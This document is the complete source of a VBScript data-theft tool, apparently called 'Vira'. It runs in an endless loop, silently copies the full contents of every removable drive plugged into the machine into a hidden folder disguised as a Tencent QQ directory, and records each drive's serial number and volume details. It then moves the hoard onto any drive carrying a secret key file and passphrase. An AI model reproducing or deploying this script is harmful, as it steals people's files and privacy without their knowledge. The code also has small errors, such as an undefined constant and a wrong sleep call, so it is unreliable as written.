'Version 2.13 Ultimate
Option Explicit
On Error Resume Next
Const ViraVersion = "2.13"

Dim Target, Container, DriveLetter, FileCheck, UDrive
Dim FlagFileNum, FlagFile, MaxCapacityGB, Pointer
Dim DriveReady, DriveInfo, HarvestCheck, IsHarvest
Dim WScript, Fso, Fin, Fout
Set WScript = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

'********************
' Customize Section
'********************

FlagFileNum = 2
FlagFile = Array("Setup.exe", "bootmgr")

MaxCapacityGB = 32
Pointer = "D:\Program Files\Tencent\QQMaster\" 'Please end with a backslash [\]

'***************************
' End of Customize Section
'***************************

Dim IsCopied(23), i, k
For i = 0 to 22
  IsCopied(i) = False
Next

WScript.Run "CMD.EXE /C MD """ & Pointer & """", 0, True
Set Container = Fso.GetFolder(Pointer)
Container.Attributes = 7

Do
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
    IsHarvest = False
    DriveReady = False
    
    If Fso.DriveExists(DriveLetter) Then
      Set UDrive = Fso.GetDrive(DriveLetter)
      If UDrive.DriveType = 1 Then
        DriveReady = True
      End If
    End If
    
    If DriveReady Then
      If Fso.FileExists(DriveLetter & ":\Modernizer.key") Then
        Set Fin = Fso.OpenTextFile(DriveLetter & ":\Modernizer.key", ForReading)
        HarvestCheck = Fin.ReadLine()
        If HarvestCheck = "Master Shiang Dzurr plays silver power." Then
          IsHarvest = True
          Target = DriveLetter & ":\Moderization\"
          Fso.CreateFolder Target
          Fso.CopyFolder Pointer & "*", Target, True
          Fso.DeleteFolder Pointer & "*", True
        End If
      End If
      
      Target = Pointer & Hex(UDrive.SerialNumber)
      If (Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000) _
      And Not IsCopied(i) And Not IsHarvest Then
        FileCheck = True
        For k = 0 to FlagFileNum - 1
          If Fso.FileExists(DriveLetter & ":\" & FlagFile(k)) Then
            FileCheck = False
            Exit For
          End If
        Next
        
        If FileCheck Then 'Copy this drive
          'Generate Disk Info
          Target = Pointer & Hex(UDrive.SerialNumber) & "\"
          Fso.CreateFolder Target
          Set Fout = Fso.OpenTextFile(Target & "Vira.ini", 2, True, 0)
          Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
          Fout.WriteLine "[Drive]"
          Fout.WriteLine "SerialNumber=" & Hex(UDrive.SerialNumber)
          Fout.WriteLine "VolumeName=" & UDrive.VolumeName
          Fout.WriteLine "FileSystem=" & UDrive.FileSystem
          Fout.WriteLine "TotalSpace=" & UDrive.TotalSize
          Fout.WriteLine "FreeSpace=" & UDrive.FreeSpace
          Fout.Close
          Set Fout = Nothing

          Fso.CopyFile DriveLetter & ":\*", Target, True
          Fso.CopyFolder DriveLetter & ":\*", Target, True
          IsCopied(i) = True
        End If
      End If
    Else
      IsCopied(i) = False
    End If 'Drive ready
  Next 'Enumerate drive
  
  Wsh.Sleep 1000
Loop


